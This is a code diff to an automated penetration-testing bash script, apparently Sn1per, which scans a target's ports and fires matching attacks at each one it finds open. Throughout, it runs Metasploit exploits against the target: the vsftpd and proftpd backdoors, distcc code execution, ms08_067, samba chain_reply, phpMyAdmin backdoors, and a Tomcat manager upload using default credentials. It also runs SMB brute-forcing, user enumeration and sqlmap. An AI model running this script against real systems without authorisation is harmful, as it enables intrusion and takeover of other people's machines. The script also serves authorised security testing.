@@ -21,6 +21,7 @@
 # ./sn1per <target>
 #
 
+SNIPER_DIR="/pentest/web/Sn1per/" # SET SNIPER INSTALL DIR
 TARGET="$1"
 LOOT_DIR="loot"
 CMSMAP="CMSmap/cmsmap.py"
@@ -60,6 +61,10 @@ else
 	SCAN_TYPE="DOMAIN"
 fi
 
+if [ -x $SNIPER_DIR ]; then
+	cd $SNIPER_DIR
+fi
+
 clear
 
 echo -e "$OKRED                ____               $RESET"
@@ -95,7 +100,8 @@ echo -e "$OKGREEN################################### Pinging host ##############
 ping -c 1 $TARGET
 echo ""
 echo -e "$OKGREEN################################### Running port scan ##############################$RESET"
-nmap -sS -sU -sV -T4 -A -O -p T:1-65535,U:53,U:67,U:68,U:88,U:161,U:162,U:137,U:138,U:139,U:389,U:520,U:2049 --open $TARGET -oX $LOOT_DIR/nmap-$TARGET.xml
+nmap -sS -sV -T4 -A -O -p 1-65535 --open $TARGET -oX $LOOT_DIR/nmap-$TARGET.xml
+nmap -sU -sV -T4 -A -O -p U:53,U:67,U:68,U:88,U:161,U:162,U:137,U:138,U:139,U:389,U:520,U:2049 --open $TARGET
 echo ""
 echo -e "$OKGREEN################################### Running Intrusive Scans ########################$RESET"
 port_21=`grep 'portid="21"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
@@ -141,7 +147,7 @@ then
 else
 	echo -e "$OKGREEN+ -- --=[Port 21 opened... running tests...$RESET"	
 	nmap -sV -sC -p 21 --script=ftp-* $TARGET
-	msfconsole -x "use exploit/unix/ftp/vsftpd_234_backdoor; setg RHOST "$TARGET"; run; use unix/ftp/proftpd_133c_backdoor; run; exit;"
+	msfconsole -x "use exploit/unix/ftp/vsftpd_234_backdoor; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; use unix/ftp/proftpd_133c_backdoor; run; exit;"
 fi
 
 if [ -z "$port_22" ]
@@ -150,7 +156,7 @@ then
 else
 	echo -e "$OKGREEN+ -- --=[Port 22 opened... running tests...$RESET"
 	nmap -sV -sC -p 22 --script=ssh-* $TARGET
-	msfconsole -x "use scanner/ssh/ssh_enumusers; set USER_FILE "$PWD"/BruteX/wordlists/simple-users.txt; setg RHOSTS "$TARGET"; run; use scanner/ssh/ssh_identify_pubkeys; run; use scanner/ssh/ssh_version; run; exit;"
+	msfconsole -x "use scanner/ssh/ssh_enumusers; setg USER_FILE "$PWD"/BruteX/wordlists/simple-users.txt; setg RHOSTS "$TARGET"; setg "$TARGET"; run; use scanner/ssh/ssh_identify_pubkeys; run; use scanner/ssh/ssh_version; run; exit;"
 fi
 
 if [ -z "$port_23" ]
@@ -171,7 +177,7 @@ else
 	echo -e "$OKGREEN+ -- --=[Port 25 opened... running tests...$RESET"
 	nmap -sV --script=smtp* -p 25 $TARGET
 	smtp-user-enum -M VRFY -U $USER_FILE -t $TARGET
-	msfconsole -x "use scanner/smtp/smtp_enum; set RHOSTS "$TARGET"; run; exit;" 
+	msfconsole -x "use scanner/smtp/smtp_enum; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; exit;" 
 fi
 
 if [ -z "$port_53" ]
@@ -265,9 +271,9 @@ else
 	nikto -h http://$TARGET 
 	wpscan --url http://$TARGET --batch
 	python $CMSMAP -t http://$TARGET
-	sqlmap -u "http://$TARGET" --batch --crawl=5 -f
 	arachni http://$TARGET --output-only-positives --scope-include-subdomains
-	msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; set RHOST "$TARGET"; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
+	sqlmap -u "http://$TARGET" --batch --crawl=2 -f
+	msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
 fi
 
 if [ -z "$port_110" ]
@@ -306,7 +312,7 @@ else
 	python $SAMRDUMP $TARGET
 	nbtscan $TARGET
 	nmap -sV -p139 --script=smb-server-stats --script=smb-ls --script=smb-enum-domains --script=smbv2-enabled --script=smb-psexec --script=smb-enum-groups --script=smb-enum-processes --script=smb-brute --script=smb-print-text --script=smb-security-mode --script=smb-os-discovery --script=smb-enum-sessions --script=smb-mbenum --script=smb-enum-users --script=smb-enum-shares --script=smb-system-info --script=smb-vuln-ms10-054 --script=smb-vuln-ms10-061 $TARGET
-	msfconsole -x "use auxiliary/scanner/smb/pipe_auditor; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/pipe_dcerpc_auditor; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/psexec_loggedin_users; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/smb2; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/smb_enum_gpp; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/smb_enumshares; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/smb_enumusers; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/smb_enumusers_domain; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/smb_login; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/smb_lookupsid; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/smb_uninit_cred; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/smb_version; set RHOSTS "$TARGET"; run; use exploit/linux/samba/chain_reply; set RHOSTS "$TARGET"; set RHOST "$TARGET"; run; use windows/smb/ms08_067_netapi; set RHOSTS "$TARGET"; set RHOST "$TARGET"; check; exit;"
+	msfconsole -x "use auxiliary/scanner/smb/pipe_auditor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use auxiliary/scanner/smb/pipe_dcerpc_auditor; run; use auxiliary/scanner/smb/psexec_loggedin_users; run; use auxiliary/scanner/smb/smb2; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_enumshares; run; use auxiliary/scanner/smb/smb_enumusers; run; use auxiliary/scanner/smb/smb_enumusers_domain; run; use auxiliary/scanner/smb/smb_login; run; use auxiliary/scanner/smb/smb_lookupsid; run; use auxiliary/scanner/smb/smb_uninit_cred; run; use auxiliary/scanner/smb/smb_version; run; use exploit/linux/samba/chain_reply; run; use windows/smb/ms08_067_netapi; run; exit;"
 fi
 
 if [ -z "$port_162" ]
@@ -347,7 +353,6 @@ else
 		goohak $TARGET > /dev/null
 		php $INURLBR --dork "site:$TARGET" -s $LOOT_DIR/inurlbr-$TARGET.txt >> $LOOT_DIR/inurlbr-$TARGET.txt
 		rm -Rf output/ cookie.txt exploits.conf
-	
 	fi
 	
 	echo -e "$OKBLUE+ -- --=[Checking if X-Content options are enabled on $TARGET...$RESET $OKORANGE"
@@ -396,15 +401,13 @@ else
 	curl -s --insecure https://$TARGET/%3f.jsp | egrep -i 'Error|Exception' | tail -n 10
 	curl -s --insecure https://$TARGET/test.aspx -L | egrep -i 'Error|Exception|System.Web.' | tail -n 10
 	echo ""
-	echo -e "$OKBLUE+ -- --=[Checking for Rom-0 Router Vulnerabilities on $TARGET...$RESET $OKORANGE"
-	curl -s --insecure https://$TARGET/rom-0 | grep 200 | tail -n 10
-	echo ""
 	echo -e "$RESET"
 	nikto -h https://$TARGET 
 	wpscan --url https://$TARGET --batch
 	python $CMSMAP -t https://$TARGET
-	sqlmap -u "https://$TARGET" --batch --crawl=5 -f
 	arachni https://$TARGET --output-only-positives --scope-include-subdomains
+	sqlmap -u "https://$TARGET" --batch --crawl=2 -f
+	msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 443; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
 fi
 
 if [ -z "$port_445" ]
@@ -416,7 +419,7 @@ else
 	python $SAMRDUMP $TARGET
 	nbtscan $TARGET
 	nmap -sV -p445 --script=smb-server-stats --script=smb-ls --script=smb-enum-domains --script=smbv2-enabled --script=smb-psexec --script=smb-enum-groups --script=smb-enum-processes --script=smb-brute --script=smb-print-text --script=smb-security-mode --script=smb-os-discovery --script=smb-enum-sessions --script=smb-mbenum --script=smb-enum-users --script=smb-enum-shares --script=smb-system-info --script=smb-vuln-ms10-054 --script=smb-vuln-ms10-061 $TARGET
-	msfconsole -x "use auxiliary/scanner/smb/pipe_auditor; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/pipe_dcerpc_auditor; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/psexec_loggedin_users; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/smb2; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/smb_enum_gpp; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/smb_enumshares; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/smb_enumusers; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/smb_enumusers_domain; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/smb_login; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/smb_lookupsid; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/smb_uninit_cred; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/smb_version; set RHOSTS "$TARGET"; run; use exploit/linux/samba/chain_reply; set RHOSTS "$TARGET"; set RHOST "$TARGET"; run; use windows/smb/ms08_067_netapi; set RHOSTS "$TARGET"; set RHOST "$TARGET"; check; exit;"
+	msfconsole -x "use auxiliary/scanner/smb/pipe_auditor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use auxiliary/scanner/smb/pipe_dcerpc_auditor; run; use auxiliary/scanner/smb/psexec_loggedin_users; run; use auxiliary/scanner/smb/smb2; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_enumshares; run; use auxiliary/scanner/smb/smb_enumusers; run; use auxiliary/scanner/smb/smb_enumusers_domain; run; use auxiliary/scanner/smb/smb_login; run; use auxiliary/scanner/smb/smb_lookupsid; run; use auxiliary/scanner/smb/smb_uninit_cred; run; use auxiliary/scanner/smb/smb_version; run; use exploit/linux/samba/chain_reply; run; use windows/smb/ms08_067_netapi; run; exit;"
 fi
 
 if [ -z "$port_512" ]
@@ -468,7 +471,7 @@ then
 else
 	echo -e "$OKGREEN+ -- --=[Port 2121 opened... running tests...$RESET"
 	nmap -sV --script=ftp* -p 2121 $TARGET
-	msfconsole -x "setg PORT 2121; use exploit/unix/ftp/vsftpd_234_backdoor; setg RHOST "$TARGET"; run; use unix/ftp/proftpd_133c_backdoor; run; exit;"
+	msfconsole -x "setg PORT 2121; use exploit/unix/ftp/vsftpd_234_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use unix/ftp/proftpd_133c_backdoor; run; exit;"
 fi
 
 if [ -z "$port_3306" ]
@@ -494,7 +497,7 @@ then
 else
 	echo -e "$OKGREEN+ -- --=[Port 3632 opened... running tests...$RESET"
 	nmap -sV --script=distcc-* -p 3632 $TARGET
-	msfconsole -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; use unix/misc/distcc_exec; run; exit;"
+	msfconsole -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use unix/misc/distcc_exec; run; exit;"
 fi
 
 if [ -z "$port_5432" ]
@@ -590,7 +593,8 @@ else
 	cd ..
 	nikto -h http://$TARGET:8080 
 	nmap -p 8080 --script=*proxy* $TARGET
-	msfconsole -x "use admin/http/tomcat_administration; setg RHOST "$TARGET"; setg RPORT 8080; setg RHOSTS "$TARGET"; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
+	arachni http://$TARGET:8080 --output-only-positives --scope-include-subdomains
+	msfconsole -x "use admin/http/tomcat_administration; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 8080; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
 fi
 
 if [ -z "$port_8180" ]
@@ -610,7 +614,7 @@ else
 	nikto -h http://$TARGET:8180 
 	nmap -p 8180 --script=*proxy* $TARGET
 	arachni http://$TARGET:8180 --output-only-positives --scope-include-subdomains
-	msfconsole -x "use admin/http/tomcat_administration; setg RHOST "$TARGET"; setg RPORT 8180; setg RHOSTS "$TARGET"; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
+	msfconsole -x "use admin/http/tomcat_administration; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 8180; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
 fi
 
 if [ -z "$port_8443" ]
